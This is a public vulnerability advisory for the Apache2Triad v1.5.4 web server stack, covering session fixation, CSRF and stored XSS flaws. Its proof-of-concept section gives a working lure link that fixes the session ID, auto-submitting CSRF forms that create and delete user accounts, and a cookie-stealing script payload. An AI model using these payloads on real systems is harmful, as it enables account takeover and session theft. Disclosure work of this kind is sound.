@@ -1,0 +1,208 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/APACHE2TRIAD-SERVER-STACK-v1.5.4-MULTIPLE-CVE.txt
+[+] ISR: ApparitionSec            
+ 
+
+Vendor:
+===============
+apache2triad.net
+https://sourceforge.net/projects/apache2triad/
+
+
+
+Product:
+===========
+Apache2Triad v1.5.4
+
+Apache2Triad spells instant and facile deployment of web software on any windows server along the lines of the WAMP paradigm
+in a point and click manner in just minutes and is a ideal solution for the setup of server farms.
+
+
+
+Vulnerability Type(s):
+======================
+Session Fixation
+Cross Site Request Forgery
+Persistent Cross Site Scripting
+
+
+CVE Reference:
+==============
+CVE-2017-12965 (Session Fixation)
+CVE-2017-12970 (Cross Site Request Forgery)
+CVE-2017-12971 (Persistent Cross Site Scripting)
+
+This application is old and not actively developed according to the website, yet it is still avail for download so
+I release the advisory.
+
+
+Security Issue(S):
+================
+CVE-2017-12965
+
+Apache2Triad allows remote attackers to set an arbitrary PHPSESSID cookie, if a Apache2Triad user authenticates using the
+attacker controlled PHPSESSID the attacker can then access the Apache2Triad Web application with same level of access
+as that of the victim to potentially take over the Apache2Triad system.
+
+e.g.
+
+Pre - Authentication
+a4ce6912be9d29a9ba4106c989859e7b
+
+Post - Authentication
+a4ce6912be9d29a9ba4106c989859e7b
+
+We see the PHPSESSID is never regenerated, to make matters worse Apache2Triad will happily accept an abitrary attacker
+supplied session cookie and persist it. Our evil cookie will get written here "C:\apache2triad\temp" as sess_HACKED123.
+
+set our cookie like,
+
+Attacker lure:
+<a href="http://VICTIM-IP/phpsftpd/?PHPSESSID=HACKED123">Important message</a>
+
+Victim logs on using our lure.
+
+HTTP 200 OK
+Response cookies	
+PHPSESSID	
+value	"HACKED123"
+path	"/"
+Request cookies	
+PHPSESSID	"HACKED123"
+
+
+Since we control the PHP Session ID and it persists across applications we can then jump to "phpxmail"
+using above session and have an authenticated session avail to do whatever we wish.
+
+e.g.
+
+http://VICTIM-IP/phpxmail/?PHPSESSID=HACKED123
+
+Now access some arbitrary application resource bypassing normal authentication.
+http://VICTIM-IP/phpxmail/main.php?action=servercmd
+
+Tested successfully in Firefox, IE
+
+
+CVE-2017-12970
+
+Remote attackers who can trick an authenticated Apache2Triad user to visit a malicious webpage or link can execute HTTP Requests
+on behalf of the authenticated user, attackers can then add or delete arbitrary users to the affected system. 
+
+Tested successfully in Firefox, IE
+
+
+CVE-2017-12971
+
+Remote attackers can execute arbitrary code that will run in the security context of the victims browser, if
+an authenticated user visits an attacker controlled webpage or link.
+
+Since Apache2Triad has Session Fixation flaw, we can leverage this to potentially bypass normal authentication. 
+XSS payload will get written to the "slimftpd.conf" configuration file under "C:\apache2triad\ftp" directory.
+
+e.g.
+
+<User "\"/><script>alert(document.cookie)</script>">
+
+</User>
+
+
+Tested successfully in Firefox
+
+
+Exploit/POC(s):
+==============
+CVE-2017-12965 (Session Fixation)
+
+1) Create lure with a attacker controlled PHPSESSID, something like...
+
+<a href="http://VICTIM-IP/phpsftpd/?PHPSESSID=HACKED123">You have new messages, logon to view</a>
+
+2) Authenticate to Apache2Triad using that link
+
+3) Open another Web Browser using above attacker supplied link. You can now access the vulnerable
+application using same PHPSESSID session cookie from another browser.
+
+
+CVE-2017-12970 (CSRF)
+
+Add user
+
+<form action="http://VICTIM-IP/phpsftpd/users.php" method="post">
+<input type="hidden" name="account" value="PWNU">
+<input type="hidden" name="create" value="Create+New+User">
+<script>//document.forms[0].submit()</script>
+</form>
+
+HTTP Response:
+"The account PWNU was sucesfully created"
+
+Create  password
+
+<form action="http://VICTIM-IP/phpsftpd/users.php" method="post">
+<input type="hidden" name="Username_d" value="PWNU">
+<input type="hidden" name="Password_d" value="abc123">
+<input type="hidden" name="update" value="Update+Settings">
+<input type="hidden" name="account" value="PWNU">
+<input type="hidden" name="instructions" value="">
+<script>//document.forms[1].submit()</script>
+</form>
+
+HTTP Response:
+"The account PWNU was sucesfully updated"
+
+
+Delete users
+
+<form action="http://VICTIM-IP/phpsftpd/users.php" method="post">
+<input type="hidden" name="delete" value="Yes">
+<input type="hidden" name="account" value="PWNU">
+<script>//document.forms[2].submit()</script>
+</form>
+
+HTTP Response:
+"The account PWNU was sucesfully deleted"
+
+
+CVE-2017-12971 (XSS)
+
+<form action="http://VICTIM-IP/phpsftpd/users.php" method="post">
+<input type="hidden" name="account" value='"/><script>alert(document.cookie)</script>'>
+<input type="hidden" name="create" value="Create+New+User">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+HTTP Response example:
+"PHPSESSID=HACKED123"
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: "No longer being maintained"
+August 21, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
